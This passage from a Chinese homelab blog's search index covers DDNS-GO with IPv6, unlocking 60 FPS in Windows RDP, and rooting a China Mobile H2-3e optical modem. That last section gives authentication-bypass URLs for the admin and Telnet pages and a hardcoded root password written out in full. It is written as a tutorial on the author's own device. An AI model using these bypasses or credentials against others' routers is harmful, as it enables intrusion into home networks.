\u200b\u7f51\u7edc\u200b\uff0c\u200b\u5373\u200b\u548c\u200b\u4e3b\u673a\u200b\u5171\u4eab\u200b IP\uff0c\u200b\u800c\u200b\u6211\u4eec\u200b\u4f20\u7edf\u200b\u7684\u200b -p \u200b\u8d70\u200b\u7684\u200b\u662f\u200b bridge \u200b\u6865\u63a5\u200b\u6a21\u5f0f\u200b\uff0c\u200b\u8fd9\u6837\u200b\u5c31\u200b\u65e0\u6cd5\u200b\u83b7\u53d6\u200b\u5230\u200b\u516c\u7f51\u200b\u7684\u200b IPv6 \u200b\u5730\u5740\u200b \uff08PS\uff1aWindows/Mac\u200b\u684c\u9762\u7248\u200b\u7684\u200b Docker\u200b\u4e0d\u200b\u652f\u6301\u200b<code>--net=host</code>\uff09</p>"},{"location":"8/3/#ddns-go","title":"DDNS-GO \u200b\u7684\u200b\u7b80\u5355\u200b\u4f7f\u7528","text":"<p>DDNS-GO \u200b\u7684\u200b\u4f7f\u7528\u200b\u975e\u5e38\u7b80\u5355\u200b\uff0c\u200b\u9996\u5148\u200b\u586b\u5199\u200b\u6211\u4eec\u200b\u57df\u540d\u200b\u5382\u5546\u200b\u7684\u200b AK \u200b\u548c\u200b SK \u200b\u5373\u53ef\u200b\uff1a</p> <p> </p> <p>\u200b\u56e0\u4e3a\u200b\u56fd\u5149\u200b\u7684\u200b\u5bb6\u5ead\u200b\u5e26\u5bbd\u200b\u65e0\u200b\u516c\u7f51\u200b\u7684\u200b IPv4\uff0c\u200b\u6240\u4ee5\u200b\u8fd9\u91cc\u200b\u53ea\u200b\u5f00\u542f\u200b IPv6 \u200b\u5730\u5740\u200b\uff1a</p> <ol> <li>\u200b\u4e00\u822c\u6765\u8bf4\u200b\u901a\u8fc7\u200b\u7f51\u5361\u200b\u83b7\u53d6\u200b\u7684\u200b IPv6 \u200b\u5730\u5740\u200b\u8981\u200b\u51c6\u786e\u200b\u4e00\u70b9\u200b</li> <li>Domains \u200b\u76f4\u63a5\u200b\u586b\u5199\u200b\u6211\u4eec\u200b\u60f3\u8981\u200b\u89e3\u6790\u200b\u7684\u200b IPv6 \u200b\u5730\u5740\u200b\u5373\u53ef\u200b\uff0cDDNS-GO \u200b\u4f1a\u200b\u81ea\u52a8\u200b\u5e26\u200b\u7740\u200b\u6211\u4eec\u200b\u7684\u200b AK \u200b\u548c\u200b SK \u200b\u53bb\u200b\u63a7\u5236\u53f0\u200b\u5e2e\u200b\u6211\u4eec\u200b\u6dfb\u52a0\u200b\u89e3\u6790\u200b\u8bb0\u5f55\u200b</li> </ol> <p> </p> <p>\u200b\u4f7f\u7528\u200b Docker \u200b\u6309\u7167\u200b\u4e0a\u8ff0\u200b\u6559\u7a0b\u200b\u5b89\u88c5\u200b DDNS-GO \u200b\u7684\u8bdd\u200b\uff0c\u200b\u6211\u4eec\u200b\u7684\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u9ed8\u8ba4\u200b\u660e\u6587\u200b\u4fdd\u5b58\u200b\u5728\u200b\uff1a</p> Bash<pre><code>cat /opt/ddns-go/.ddns_go_config.yaml\n</code></pre> <p> </p> <p>\u200b\u8fd9\u6837\u200b\u5c31\u7b97\u200b\u914d\u7f6e\u200b\u4e86\u200b\u5bc6\u7801\u200b\uff0c\u200b\u5fd8\u8bb0\u200b\u4e86\u200b\u67e5\u770b\u200b\u4e00\u4e0b\u200b\u8fd9\u4e2a\u200b\u6587\u4ef6\u200b\u5373\u53ef\u200b\uff0c\u200b\u540c\u65f6\u200b\u4e5f\u200b\u8981\u200b\u8bb0\u4f4f\u200b\u4e0d\u8981\u200b\u968f\u4fbf\u200b\u6cc4\u9732\u200b\u8fd9\u4e2a\u200b\u6587\u4ef6\u200b\uff0c\u200b\u6bd5\u7adf\u200b\u91cc\u9762\u200b\u5e26\u200b\u7740\u200b\u6211\u4eec\u200b\u7684\u200b  AK \u200b\u548c\u200b SK \u200b\u4fe1\u606f\u200b\u3002</p>"},{"location":"8/3/#ddns-ipv6","title":"DDNS IPv6 \u200b\u89e3\u6790\u200b\u6548\u679c","text":"<p>DDNS-GO \u200b\u4f1a\u200b\u5728\u200b\u963f\u91cc\u200b\u4e91\u200b\u63a7\u5236\u53f0\u200b\u91cc\u9762\u200b\u81ea\u52a8\u200b\u6dfb\u52a0\u200b AAA  IPv6 \u200b\u7684\u200b\u89e3\u6790\u200b\u8bb0\u5f55\u200b\uff1a</p> <p> </p> <p>\u200b\u7136\u540e\u200b\u6211\u4eec\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u5728\u200b\u6709\u200b IPv6 \u200b\u516c\u7f51\u200b\u7684\u200b\u7f51\u7edc\u200b\u73af\u5883\u200b\u968f\u65f6\u968f\u5730\u200b\u8bbf\u95ee\u200b\u6211\u4eec\u200b\u7684\u200b PVE \u200b\u63a7\u5236\u53f0\u200b\u4e86\u200b\uff1a</p> <p> </p>"},{"location":"8/4/","title":"\u8fdc\u7a0b\u684c\u9762","text":"<p>\u200b\u5b9e\u9645\u4e0a\u200b Windows \u200b\u81ea\u5bb6\u200b\u7684\u200b RDP \u200b\u5df2\u7ecf\u200b\u6ee1\u8db3\u200b\u5927\u591a\u6570\u200b\u7528\u6237\u200b\u4f7f\u7528\u200b\u4e86\u200b\uff0c\u200b\u6211\u4eec\u200b\u8fd8\u200b\u53ef\u4ee5\u200b\u7ee7\u7eed\u200b\u4f18\u5316\u200b\u4f18\u5316\u200b\uff0c\u200b\u6b63\u5e38\u200b\u6572\u4e2a\u200b\u4ee3\u7801\u200b\u5565\u200b\u7684\u200b\u90fd\u200b\u7ef0\u7ef0\u6709\u4f59\u200b\u4e86\u200b\u3002</p>"},{"location":"8/4/#_1","title":"\u89e3\u9501\u200b\u5e27\u200b\u6570","text":"<p>Windows \u200b\u7684\u200b RDP \u200b\u8fdc\u7a0b\u684c\u9762\u200b\u9ed8\u8ba4\u200b\u7684\u200b FPS \u200b\u9650\u5236\u200b\u4e3a\u200b 30 FPS\uff0c\u200b\u8fd9\u4e2a\u200b\u5e27\u200b\u6570\u200b\u5176\u5b9e\u200b\u6572\u200b\u4ee3\u7801\u200b\u786e\u5b9e\u200b\u4e5f\u200b\u5b8c\u5168\u200b\u8db3\u591f\u200b\u4e86\u200b\uff1a</p> <p> </p> <p>\u200b\u4f46\u662f\u200b\u9ad8\u5237\u200b\u663e\u793a\u5668\u200b\u7528\u6237\u200b\u53ef\u80fd\u200b\u96be\u4ee5\u200b\u63a5\u53d7\u200b\uff0c\u200b\u597d\u200b\u5728\u200b\u6211\u4eec\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b\u7f16\u8f91\u200b\u6ce8\u518c\u8868\u200b\u89e3\u9501\u200b\u8fd9\u4e2a\u200b\u5e27\u200b\u6570\u200b\u7684\u200b\u9650\u5236\u200b\u3002</p> <p>\u200b\u9996\u5148\u200b\u6253\u5f00\u200b\u6ce8\u518c\u8868\u200b\u7f16\u8f91\u5668\u200b\uff0c\u200b\u7136\u540e\u200b\u8df3\u8f6c\u200b\u5230\u200b\uff1a</p> INI<pre><code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\n</code></pre> <p>\u200b\u9009\u62e9\u200b\u300c\u200b\u65b0\u5efa\u200b\u300d\uff0c\u200b\u7136\u540e\u200b\u9009\u62e9\u200b\u300cDWORD\uff0832 \u200b\u4f4d\u200b\uff09\u200b\u503c\u200b\u300d\uff1a</p> <p> </p> <p>\u200b\u540d\u79f0\u200b\u4e3a\u200b\uff1aDWMFRAMEINTERVAL\uff0c\u200b\u57fa\u6570\u200b\u9009\u62e9\u200b\u5341\u8fdb\u5236\u200b\uff0c\u200b\u6570\u503c\u6570\u636e\u200b\u586b\u5199\u200b\uff1a15</p> <p> </p> \u200b\u56fd\u5149\u200b\u5c0f\u200b\u8bfe\u5802\u200b\uff1aRDP \u200b\u5176\u4ed6\u200b\u5e27\u200b\u6570\u200b\u5bf9\u5e94\u200b\u8868\u200b \u200b\u5341\u8fdb\u5236\u200b FPS \u200b\u5e27\u200b\u6570\u200b 15 60 10 40 5 20 1 4 <p>\u200b\u4e00\u987f\u200b\u64cd\u4f5c\u200b\u540e\u200b RDP \u200b\u7684\u200b\u5e27\u200b\u6570\u200b\u5df2\u7ecf\u200b\u63d0\u9ad8\u200b\u4e86\u200b\u5f88\u591a\u200b\uff1a</p> <p> </p> <p>\u200b\u5173\u4e8e\u200b RDP \u200b\u4f18\u5316\u200b\u6559\u7a0b\u200b\u4e2d\u200b\uff0c\u200b\u9664\u4e86\u200b\u8fd9\u4e2a\u200b\u4fee\u6539\u200b\u6ce8\u518c\u8868\u200b\u5f00\u542f\u200b 60FPS \u200b\u662f\u200b\u5168\u7403\u200b\u7edf\u4e00\u200b\u7684\u200b\uff0c\u200b\u540e\u9762\u200b\u7684\u200b\u4f18\u5316\u200b\u6559\u7a0b\u200b\u56fd\u5149\u200b\u6d4b\u8bd5\u200b\u4e86\u200b\u4e00\u4e9b\u200b\u611f\u89c9\u200b\u5c31\u662f\u200b\u4ee5\u8bb9\u4f20\u8bb9\u200b\uff0c\u200b\u56fd\u5149\u200b\u53ea\u7528\u200b\u6570\u636e\u200b\u6765\u200b\u8bf4\u8bdd\u200b\uff0c\u200b\u6bd5\u7adf\u200b\u5b9e\u8df5\u200b\u662f\u200b\u68c0\u9a8c\u200b\u771f\u7406\u200b\u7684\u200b\u552f\u4e00\u6807\u51c6\u200b\u3002   </p>"},{"location":"8/4/#rdp","title":"RDP \u200b\u7ec6\u8282","text":"<ol> <li>macOS \u200b\u5f00\u200b\u865a\u62df\u673a\u200b\uff0c\u200b\u7136\u540e\u200b\u4f7f\u7528\u200b RDP \u200b\u8fde\u63a5\u200b\u6d41\u7545\u200b\u5ea6\u200b\u4e0d\u5982\u200b\u7269\u7406\u200b\u673a\u200b\u7684\u200b Windows \u200b\u7684\u200b\u8fde\u63a5\u200b\u6548\u679c\u200b</li> <li>TestUFO \u200b\u6d4b\u8bd5\u200b\u5e27\u200b\u6570\u200b\u5e76\u200b\u4e0d\u662f\u200b RDP \u200b\u5b9e\u9645\u200b\u663e\u793a\u200b\u7684\u200b\u5e27\u200b\u6570\u200b\uff0c\u200b\u5efa\u8bae\u200b\u4ee5\u200b RDP \u200b\u81ea\u5e26\u200b\u7684\u200b\u4e3a\u51c6\u200b</li> <li>Windows 11 \u200b\u5f00\u59cb\u200b\uff0c RDP \u200b\u70b9\u51fb\u200b\u4fe1\u53f7\u200b\u56fe\u6807\u200b\uff0c\u200b\u7136\u540e\u200b\u5c55\u5f00\u200b\u8be6\u7ec6\u4fe1\u606f\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u8fde\u63a5\u200b\u7684\u200b\u5177\u4f53\u200b\u53c2\u6570\u200b</li> <li>RDP \u200b\u4f18\u5316\u200b\u8bbe\u8ba1\u200b\u5230\u200b\u89e3\u7801\u200b\u663e\u5361\u200b\u52a0\u901f\u200b\u7684\u200b\u6559\u7a0b\u200b\uff0c\u200b\u8fd9\u4e9b\u200b\u4f18\u5316\u200b\u65b9\u6cd5\u200b\u7684\u200b\u6548\u679c\u200b\u5efa\u8bae\u200b\u81ea\u5df1\u200b\u6d4b\u8bd5\u200b\uff0c\u200b\u4ee5\u200b\u5b9e\u9645\u200b\u6d4b\u8bd5\u200b\u4e3a\u51c6\u200b</li> </ol>"},{"location":"8/4/#_2","title":"\u663e\u5361\u200b\u52a0\u901f","text":"<p>\u200b\u5efa\u8bae\u200b\u6709\u200b\u72ec\u663e\u200b\u7684\u200b\u673a\u5668\u914d\u7f6e\u200b\u663e\u5361\u200b\u52a0\u901f\u200b\uff0c\u200b\u7f16\u8f91\u200b\u300c\u200b\u7ec4\u7b56\u7565\u200b\u300d\u200b\u4f9d\u6b21\u200b\u627e\u5230\u200b \u300c\u200b\u8ba1\u7b97\u673a\u200b\u914d\u7f6e\u200b\u300d -&gt; \u300c\u200b\u7ba1\u7406\u200b\u6a21\u677f\u200b\u300d -&gt; \u300cWindows \u200b\u7ec4\u4ef6\u200b\u300d -&gt; \u300c\u200b\u8fdc\u7a0b\u684c\u9762\u200b\u670d\u52a1\u200b\u300d -&gt; \u300c\u200b\u8fdc\u7a0b\u684c\u9762\u200b\u4f1a\u8bdd\u200b\u4e3b\u673a\u200b\u300d -&gt; \u300c\u200b\u8fdc\u7a0b\u200b\u4f1a\u8bdd\u200b\u73af\u5883\u200b\u300d\u200b\u91cc\u9762\u200b\u6d89\u53ca\u200b\u5230\u200b\u4e86\u200b\u51e0\u4e2a\u200b\u90e8\u5206\u200b\uff0c\u200b\u4e0b\u9762\u200b\u56fd\u5149\u200b\u6765\u200b\u4e00\u4e00\u200b\u6d4b\u8bd5\u200b\u8fd9\u90e8\u5206\u200b\u5185\u5bb9\u200b\u3002</p> \u200b\u64cd\u4f5c\u65b9\u6cd5\u200b \u200b\u4f20\u8f93\u200b\u534f\u8bae\u200b \u200b\u5f80\u8fd4\u200b\u65f6\u95f4\u200b \u200b\u5e73\u5747\u200b\u5e26\u5bbd\u200b FPS \u200b\u6ce2\u52a8\u200b\u8303\u56f4\u200b \u200b\u5e73\u5747\u200b FPS \u200b\u786c\u4ef6\u200b\u56fe\u5f62\u200b UDP 16ms 81.82 Mbps 55~62 FPS 59 FPS"},{"location":"9/5/","title":"IPv6\u200b\u4e0e\u200b\u5149\u732b","text":""},{"location":"9/5/#_1","title":"\u5410\u69fd\u200b\u4e00\u4e0b","text":"<p>\u200b\u968f\u7740\u200b\u7f51\u7edc\u200b\u7684\u200b\u53d1\u5c55\u200b\uff0c\u200b\u56fd\u5185\u200b\u8fd0\u8425\u5546\u200b\u7684\u200b\u5149\u732b\u200b\u9650\u5236\u200b\u8d8a\u6765\u8d8a\u200b\u4e25\u683c\u200b\u3002\u200b\u867d\u7136\u200b\u51fa\u53d1\u70b9\u200b\u53ef\u80fd\u200b\u662f\u200b\u4e3a\u4e86\u200b\u4fdd\u62a4\u200b\u7528\u6237\u200b\u5bb6\u5ead\u8bbe\u5907\u200b\u7684\u200b\u7f51\u7edc\u5b89\u5168\u200b\uff0c\u200b\u4f46\u662f\u200b\u5bf9\u4e8e\u200b\u6211\u4eec\u200b\u8fd9\u4e9b\u200b\u6709\u200b\u6298\u817e\u200b\u9700\u6c42\u200b\u7684\u200b\u7528\u6237\u200b\u6765\u8bf4\u200b\u95e8\u69db\u200b\u5c31\u200b\u9ad8\u200b\u4e86\u200b\u5f88\u591a\u200b\u3002\u200b\u4e0b\u9762\u200b\u56fd\u5149\u200b\u5c31\u200b\u62ff\u200b\u6c5f\u82cf\u200b\u5357\u4eac\u200b\u79fb\u52a8\u200b\u7684\u200b\u5149\u732b\u200b\u4e3a\u4f8b\u200b\uff0c\u200b\u8bb0\u5f55\u200b\u4e00\u4e0b\u200b\u56fd\u5149\u200b\u6211\u200b\u7684\u200b\u6298\u817e\u200b\u8fc7\u7a0b\u200b\u3002</p>"},{"location":"9/5/#_2","title":"\u5149\u732b\u200b\u73b0\u72b6","text":""},{"location":"9/5/#_3","title":"\u5916\u89c2\u200b\u6982\u89c8","text":"<p>\u200b\u8bbe\u5907\u200b\u540d\u79f0\u200b\uff1a\u200b\u5409\u200b\u6bd4\u7279\u200b\u65e0\u6e90\u200b\u5149\u7ea4\u200b\u63a5\u5165\u200b\u7528\u6237\u7aef\u200b\u8bbe\u5907\u200b(GPON ONU) \u200b\u8bbe\u5907\u200b\u7c7b\u578b\u200b\uff1a\u200b\u4e2d\u56fd\u79fb\u52a8\u200b\u667a\u80fd\u7f51\u200b\u5173\u200b \u200b\u8bbe\u5907\u200b\u578b\u53f7\u200b\uff1aH2-3e\uff08\u200b\u65e0\u200b\u8bed\u97f3\u200b/\u200b\u65e0\u200b Wi-Fi\uff09 \u200b\u751f\u4ea7\u65e5\u671f\u200b\uff1a2022-08-18</p> <p>\u200b\u5bb6\u200b\u7528\u5149\u200b\u732b\u200b\u7684\u200b\u6027\u80fd\u200b\u90fd\u200b\u6bd4\u8f83\u200b\u5783\u573e\u200b\uff0c\u200b\u56fd\u5149\u200b\u6211\u200b\u76ee\u524d\u200b\u4f7f\u7528\u200b\u7684\u200b\u5149\u732b\u200b\u914d\u7f6e\u200b\u8fd8\u200b\u7b97\u662f\u200b\u4e0d\u9519\u200b\u7684\u200b\u4e86\u200b\uff08\u200b\u77ee\u5b50\u200b\u91cc\u200b\u62d4\u9ad8\u200b\u4e2a\u200b\uff09\uff0c\u200b\u6700\u8d77\u7801\u200b\u6709\u200b 4 \u200b\u4e2a\u200b\u5343\u5146\u200b LAN \u200b\u53e3\u200b\uff0c\u200b\u4e0b\u9762\u200b\u662f\u200b\u51e0\u5f20\u200b\u5916\u89c2\u200b\u56fe\u7247\u200b\uff1a</p> \u200b\u80cc\u9762\u200b\u4fe1\u606f\u200b\u6b63\u9762\u200b\u4fe1\u606f\u200b\u63a5\u53e3\u200b\u4fe1\u606f\u200b <p> </p> <p>\u200b\u53ef\u4ee5\u200b\u770b\u51fa\u200b\u662f\u200b 2022 \u200b\u5e74\u200b 8 \u200b\u6708\u4efd\u200b\u751f\u4ea7\u200b\u7684\u200b\u5149\u732b\u200b\uff0c\u200b\u6240\u4ee5\u200b\u7406\u8bba\u200b\u4e0a\u200b\u6765\u8bf4\u200b\u56fa\u4ef6\u200b\u662f\u200b\u6bd4\u8f83\u200b\u65b0\u200b\u7684\u200b\uff0c\u200b\u95e8\u69db\u200b\u4e5f\u200b\u6bd4\u200b\u7f51\u4e0a\u200b\u90a3\u4e9b\u200b\u8001\u200b\u7684\u200b\u5149\u732b\u200b\u95e8\u69db\u200b\u9ad8\u200b\u4e00\u70b9\u200b\u3002 </p> <p> </p> <p>\u200b\u6b63\u9762\u200b\u6ca1\u200b\u5565\u200b\u597d\u770b\u200b\u7684\u200b\uff0c\u200b\u6beb\u65e0\u200b\u4eae\u70b9\u200b\u3002</p> <p></p> <p>\u200b\u5c31\u200b\u8fd9\u200b 4 \u200b\u4e2a\u200b\u5168\u200b\u5343\u5146\u200b LAN \u200b\u53e3\u200b\u611f\u89c9\u200b\u8fd8\u200b\u6709\u70b9\u200b\u7528\u5904\u200b\uff0c\u200b\u540e\u9762\u200b\u6539\u200b\u6865\u63a5\u200b\u53ef\u4ee5\u200b\u591a\u63a5\u200b\u4e00\u4e9b\u200b\u8bbe\u5907\u200b\u3002</p>"},{"location":"9/5/#_4","title":"\u7cfb\u7edf\u200b\u6982\u51b5","text":"<p>\u200b\u666e\u901a\u7528\u6237\u200b\u53ea\u80fd\u200b\u4f7f\u7528\u200b\u5149\u732b\u200b\u80cc\u9762\u200b\u7684\u200b user \u200b\u666e\u901a\u7528\u6237\u200b\u767b\u5f55\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u65b0\u4e00\u4ee3\u200b\u5149\u732b\u200b\u90fd\u200b\u662f\u200b\u901a\u8fc7\u200b\u8fdc\u7a0b\u200b\u4e0b\u53d1\u200b\u5b9a\u671f\u200b\u66f4\u6539\u200b\u5bc6\u7801\u200b\u7684\u200b\uff0c\u200b\u6240\u4ee5\u200b\u5e76\u200b\u6ca1\u6709\u200b\u9ed8\u8ba4\u200b\u7684\u200b\u8d85\u7ba1\u200b\u5bc6\u7801\u200b\uff0c\u200b\u8fd9\u5757\u200b\u5148\u653e\u200b\u4e00\u653e\u200b\uff0c\u200b\u6211\u4eec\u200b\u5148\u200b\u4f7f\u7528\u200b\u666e\u901a\u7528\u6237\u200b\u767b\u5f55\u200b\u770b\u770b\u200b\u518d\u8bf4\u200b\uff1a</p> <p> </p> <p>\u200b\u4e0b\u9762\u200b\u662f\u200b\u51e0\u5f20\u200b\u7cfb\u7edf\u200b\u5185\u90e8\u200b\u7684\u200b\u56fe\u7247\u200b\u4fe1\u606f\u200b\uff1a</p> \u200b\u5bbd\u5e26\u7f51\u200b\u5173\u200b\u8bbe\u5907\u200bDHCP\u200b\u5b89\u5168\u200b\u5bb6\u957f\u200b\u5b58\u50a8\u200b\u7f51\u901f\u200b\u4e0a\u7f51\u200b\u66f4\u65b0\u200b\u7528\u6237\u200b <p> </p> <p>\u200b\u5c55\u793a\u200b\u4e86\u200b\u4e00\u4e9b\u200b\u6e29\u5ea6\u200b\u548c\u200b\u8054\u7f51\u200b\u670d\u52a1\u200b\u60c5\u51b5\u200b\u7b49\u200b\u57fa\u672c\u200b\u4fe1\u606f\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u56fd\u5149\u200b\u6211\u200b\u8fd9\u91cc\u200b\u8054\u7f51\u200b\u670d\u52a1\u200b\u60c5\u51b5\u200b\u5c11\u200b\u4e86\u200b 1 \u200b\u4e2a\u200b\u300c\u200b\u4e2d\u56fd\u79fb\u52a8\u200b\u5bbd\u5e26\u200b\u7ba1\u7406\u4e2d\u5fc3\u200b\u300d\uff0c\u200b\u8fd9\u200b\u662f\u56e0\u4e3a\u200b\u56fd\u5149\u200b\u6211\u200b\u540e\u9762\u200b\u624b\u52a8\u200b\u5220\u6389\u200b\u8fd9\u4e2a\u200b\u670d\u52a1\u200b\u4e86\u200b\uff0c\u200b\u5220\u200b\u4e86\u200b\u8fd9\u4e2a\u200b\u670d\u52a1\u200b\u6211\u4eec\u200b\u7684\u200b\u5149\u732b\u200b\u5c31\u200b\u4e0d\u4f1a\u200b\u88ab\u200b\u8fdc\u7a0b\u200b\u4e0b\u53d1\u200b\u4efb\u52a1\u200b\u4e86\u200b\uff0c\u200b\u8d85\u7ba1\u200b\u5bc6\u7801\u200b\u4e5f\u200b\u4e0d\u4f1a\u200b\u88ab\u200b\u5b9a\u671f\u200b\u66f4\u6539\u200b\u3002\u200b\u4e0b\u9762\u200b\u770b\u770b\u200b\u6ca1\u6709\u200b\u5220\u200b\u4e4b\u524d\u200b\u662f\u200b\u5565\u6837\u5b50\u200b\u7684\u200b\uff1a</p> <p> </p> <p></p> <p>\u200b\u5c55\u793a\u200b\u4e86\u200b CPU\u3001\u200b\u5185\u5b58\u200b\u7684\u200b\u4f7f\u7528\u7387\u200b\uff0c\u200b\u4ee5\u53ca\u200b\u63a5\u53e3\u200b\u7684\u200b\u8fde\u63a5\u200b\u4fe1\u606f\u200b\u7b49\u200b\u3002\u200b\u786c\u4ef6\u200b\u578b\u53f7\u200b\u4e3a\u200b\u5409\u200b\u6bd4\u7279\u200b H2-3e\uff0c\u200b\u6240\u200b\u4f7f\u7528\u200b\u7684\u200b\u56fa\u4ef6\u200b\u7248\u672c\u200b HWVer-A911</p> <p></p> <p></p> <p></p> <p> </p> <p></p> <p></p> <p></p> <p></p> <p></p>"},{"location":"9/5/#_5","title":"\u7b80\u5355\u200b\u603b\u7ed3","text":"<p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u666e\u901a\u7528\u6237\u200b\u8fdb\u53bb\u200b\u57fa\u672c\u4e0a\u200b\u5565\u200b\u4e5f\u200b\u5e72\u4e0d\u4e86\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u524d\u7aef\u200b\u9875\u9762\u200b\u7ed9\u200b\u4eba\u200b\u4e00\u79cd\u200b\u534a\u6210\u54c1\u200b\u7684\u200b\u611f\u89c9\u200b\uff0c\u200b\u6211\u4eec\u200b\u5f88\u591a\u200b\u8fdb\u9636\u200b\u64cd\u4f5c\u200b\u5728\u200b\u8fd9\u4e2a\u200b\u754c\u9762\u200b\u80af\u5b9a\u200b\u662f\u200b\u6ca1\u6cd5\u200b\u64cd\u4f5c\u200b\u7684\u200b\uff0c\u200b\u6240\u4ee5\u200b\u9700\u8981\u200b\u4f7f\u7528\u200b\u8d85\u7ba1\u200b\uff08CMCCAdmin\uff09\u200b\u7684\u200b\u8eab\u4efd\u200b\u8fdb\u200b\u540e\u53f0\u200b\u624d\u200b\u53ef\u4ee5\u200b\u3002</p>"},{"location":"9/5/#_6","title":"\u8d85\u7ba1\u200b\u6743\u9650","text":""},{"location":"9/5/#_7","title":"\u8d8a\u6743\u200b\u8bbf\u95ee","text":"<p>\u200b\u4e2d\u56fd\u79fb\u52a8\u200b\u8fd9\u4e2a\u200b\u5409\u200b\u6bd4\u7279\u200b H2-3e \u200b\u5149\u732b\u200b\u7684\u200b Web \u200b\u7cfb\u7edf\u200b\u5199\u200b\u7684\u200b\u5f88\u200b\u5783\u573e\u200b\uff0c\u200b\u5728\u200b user \u200b\u7528\u6237\u200b\u767b\u5f55\u200b\u7684\u200b\u72b6\u6001\u200b\u4e0b\u200b\uff0c\u200b\u7136\u540e\u200b\u8bbf\u95ee\u200b\u4e0b\u9762\u200b\u7684\u200b\u754c\u9762\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u8d8a\u6743\u200b\u8bbf\u95ee\u200b\u5230\u200b CMCCAdmin \u200b\u7684\u200b\u7ba1\u7406\u200b\u9875\u9762\u200b\uff1a</p> <p>http://192.168.1.1/start.ghtml</p> <p> </p> <p>\u200b\u4f46\u662f\u200b\u5427\u200b\u867d\u7136\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u8fd9\u4e2a\u200b\u754c\u9762\u200b\u4e86\u200b\uff0c\u200b\u8fd8\u662f\u200b\u6709\u200b\u4e00\u4e9b\u200b\u529f\u80fd\u200b\u6211\u4eec\u200b\u662f\u200b\u65e0\u6cd5\u200b\u64cd\u4f5c\u200b\u7684\u200b\uff08\u200b\u6865\u63a5\u200b\u529f\u80fd\u200b\u3001\u200b\u9632\u706b\u5899\u200b\u5173\u95ed\u200b\u7b49\u200b\uff09\uff0c\u200b\u6240\u4ee5\u200b\u6211\u4eec\u200b\u9700\u8981\u200b\u5149\u660e\u6b63\u5927\u200b\u7684\u200b\u62ff\u5230\u200b\u771f\u6b63\u200b\u7684\u200b CMCCAdmin \u200b\u7528\u6237\u200b\u7684\u200b\u5bc6\u7801\u200b\u6765\u200b\u767b\u5f55\u200b\u64cd\u4f5c\u200b\u8fd9\u4e2a\u200b\u754c\u9762\u200b\u624d\u884c\u200b\u3002</p>"},{"location":"9/5/#telnet","title":"\u5f00\u542f\u200b Telnet","text":"<p>\u200b\u9ed8\u8ba4\u200b\u60c5\u51b5\u200b\u4e0b\u5149\u200b\u732b\u200b\u662f\u200b\u6ca1\u6709\u200b\u5f00\u542f\u200b Telnet 23 \u200b\u7aef\u53e3\u200b\u7684\u200b\uff0c\u200b\u8fd9\u6837\u200b\u6211\u4eec\u200b\u5c31\u200b\u6ca1\u6cd5\u200b\u548c\u200b\u5149\u732b\u200b shell \u200b\u4ea4\u4e92\u200b\u4e86\u200b\uff1a</p> <p> </p> <p>\u200b\u8fd8\u662f\u200b\u9274\u6743\u200b\u4e0d\u5f53\u200b\u7684\u200b\u6f0f\u6d1e\u200b\uff0c\u200b\u5728\u200b user \u200b\u7528\u6237\u200b\u767b\u5f55\u200b\u7684\u200b\u72b6\u6001\u200b\u4e0b\u200b\uff0c\u200b\u6211\u4eec\u200b\u53ef\u4ee5\u200b\u8bbf\u95ee\u200b\u4e0b\u9762\u200b\u7684\u200b URL \u200b\u76f4\u63a5\u200b\u8df3\u8f6c\u200b\u5230\u200b Telnet \u200b\u7684\u200b\u914d\u7f6e\u200b\u9875\u9762\u200b\uff1a</p> <p>http://192.168.1.1/getpage.gch?pid=1002&amp;nextpage=tele_sec_tserver_t.gch</p> <p>\u200b\u7136\u540e\u200b\u5f00\u542f\u200b Telnet\uff0c\u200b\u8bbe\u7f6e\u200b\u597d\u200b Telnet \u200b\u7684\u200b\u7528\u6237\u540d\u200b  CMCCAdmin \u200b\u7684\u200b\u5bc6\u7801\u200b\uff0c\u200b\u7136\u540e\u200b\u52fe\u9009\u200b WAN \u200b\u548c\u200b LAN \u200b\u4fa7\u200b\u8bbf\u95ee\u200b\uff08\u200b\u4fdd\u5b58\u200b \u200b\u591a\u200b\u64cd\u4f5c\u200b\u51e0\u6b21\u200b\u5c31\u884c\u200b\uff09\uff1a</p> <p> </p> <p>\u200b\u6b64\u65f6\u200b\u5728\u200b\u770b\u770b\u200b\u5149\u732b\u200b\u7684\u200b\u7aef\u53e3\u200b\u5f00\u653e\u200b\u60c5\u51b5\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u53d1\u73b0\u200b 23 \u200b\u7aef\u53e3\u200b\u6b63\u5e38\u200b\u5f00\u653e\u200b\u4e86\u200b\uff1a</p> <p> </p>"},{"location":"9/5/#root","title":"\u83b7\u53d6\u200b root \u200b\u6743\u9650","text":"<p>\u200b\u56e0\u4e3a\u200b\u5386\u53f2\u200b\u9057\u7559\u200b\u7684\u200b\u95ee\u9898\u200b\uff0c\u200b\u4e5f\u200b\u662f\u200b\u4e2d\u56fd\u79fb\u52a8\u200b\u7684\u200b\u4ee3\u7801\u200b\u5199\u200b\u7684\u200b\u592a\u70c2\u200b\u4e86\u200b\uff0c\u200b\u5f88\u591a\u200b\u9ad8\u200b\u6743\u9650\u200b\u7684\u200b\u5bc6\u7801\u200b\u751a\u81f3\u200b\u76f4\u63a5\u200b\u786c\u200b\u7f16\u7801\u200b\u5230\u200b\u4ee3\u7801\u200b\u91cc\u9762\u200b\uff1a</p> <p> </p> <p>\u200b\u6240\u4ee5\u200b\u5e78\u8fd0\u200b\u7684\u200b\u662f\u200b\uff0cTelnet \u200b\u4e0b\u200b su \u200b\u5207\u6362\u200b root \u200b\u7528\u6237\u200b\uff0c\u200b\u5bc6\u7801\u200b\u4f9d\u7136\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b\uff1a  aDm8H%MdA \u200b\u767b\u5f55\u200b</p> <p> 